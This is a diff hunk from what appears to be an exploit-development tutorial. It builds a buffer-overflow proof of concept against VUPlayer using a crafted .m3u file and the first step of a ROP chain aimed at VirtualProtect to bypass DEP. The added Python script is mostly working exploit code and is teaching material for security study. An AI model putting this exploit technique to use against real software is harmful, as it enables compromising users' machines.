@@ -229,4 +229,37 @@ makedafile.write(fuzz)
 makedafile.close()
 ```
 
+EAX, when this is run, will now hold the value `0x90909090`. Let's test it out by adding the variable `eax` to our `rop` variable and running it. POC looks like this now: 
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop                                                
+# ECX <writeable pointer> => flProtect                                 
+# EDX 00000040 => flNewProtect                             
+# EBX 00000201 => dwSize                                            
+# ESP ???????? => Leave as is                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..)                
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+# EDI 10101008 => ROP-Nop same as EIP
+
+# EAX Chunk Affects: EAX
+eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
+eax += struct.pack('<L', 0x90909090)
+
+rop = eax
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += rop
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
 
